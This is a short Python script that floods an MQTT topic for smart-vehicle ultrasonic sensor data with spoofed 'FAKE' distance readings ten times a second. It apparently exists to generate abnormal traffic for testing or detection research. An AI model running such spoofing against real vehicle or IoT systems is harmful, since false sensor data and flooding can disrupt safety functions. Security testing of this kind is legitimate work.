import time
import paho.mqtt.client as mqtt
import json
from datetime import datetime

broker_ip = "192.168.0.10"
topic = "smart/vehicle/ultrasonic_data"
client = mqtt.Client()
client.connect(broker_ip, 1883, 60)

try:
    while True:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        fake_payload = {
            "timestamp": timestamp,
            "distance_cm": "FAKE"  # Spoofed or garbage data
        }
        client.publish(topic, json.dumps(fake_payload))
        print(f"[{timestamp}] Spoofed message sent")
        time.sleep(0.1)  # 10 messages/sec ? abnormal traffic
except KeyboardInterrupt:
    print("Stopped.")

